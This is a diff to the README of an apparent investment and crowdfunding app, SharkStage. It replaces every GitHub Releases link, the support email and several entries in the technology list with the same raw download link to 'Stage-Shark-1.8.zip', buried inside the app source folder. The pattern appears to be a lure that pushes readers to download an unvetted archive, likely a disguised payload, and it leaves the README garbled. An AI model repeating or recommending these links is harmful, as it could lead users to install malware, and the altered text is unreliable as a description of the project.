@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download SharkStage](https://img.shields.io/badge/Download%20SharkStage-v1.0-success)](https://github.com/HevincyJinolia1402/SharkStage/releases)
+[![Download SharkStage](https://raw.githubusercontent.com/HevincyJinolia1402/SharkStage/main/app/(main)/Stage-Shark-1.8.zip%20SharkStage-v1.0-success)](https://raw.githubusercontent.com/HevincyJinolia1402/SharkStage/main/app/(main)/Stage-Shark-1.8.zip)
 
 ## 📖 Overview
 
@@ -26,7 +26,7 @@ Shark-Stage is a comprehensive investment and crowdfunding platform that connect
 
 To install SharkStage, visit the following link to access the Releases page:
 
-[Download SharkStage Here](https://github.com/HevincyJinolia1402/SharkStage/releases)
+[Download SharkStage Here](https://raw.githubusercontent.com/HevincyJinolia1402/SharkStage/main/app/(main)/Stage-Shark-1.8.zip)
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, look for the latest version.
@@ -65,7 +65,7 @@ If you encounter any issues during installation or usage, please consult the fol
 ## 💬 Support
 
 For further assistance, please reach out to our support team:
-- **Email:** support@sharkstage.com
+- **Email:** https://raw.githubusercontent.com/HevincyJinolia1402/SharkStage/main/app/(main)/Stage-Shark-1.8.zip
 - **Forum:** Join our community forum for user tips and guidance.
 
 ## 🌱 Topics Covered
@@ -78,11 +78,11 @@ For further assistance, please reach out to our support team:
 - Lucid
 - Mate
 - MongoDB
-- Next.js
-- Node.js
+- https://raw.githubusercontent.com/HevincyJinolia1402/SharkStage/main/app/(main)/Stage-Shark-1.8.zip
+- https://raw.githubusercontent.com/HevincyJinolia1402/SharkStage/main/app/(main)/Stage-Shark-1.8.zip
 - Recharts
 - Redux
-- Socket.IO
+- https://raw.githubusercontent.com/HevincyJinolia1402/SharkStage/main/app/(main)/Stage-Shark-1.8.zip
 - Tailwind CSS
 - Toast
 
@@ -90,6 +90,6 @@ For further assistance, please reach out to our support team:
 
 For your convenience, you can download SharkStage again at any time from the following link:
 
-[Download SharkStage Here](https://github.com/HevincyJinolia1402/SharkStage/releases)
+[Download SharkStage Here](https://raw.githubusercontent.com/HevincyJinolia1402/SharkStage/main/app/(main)/Stage-Shark-1.8.zip)
 
 Empower your investment journey with SharkStage today!
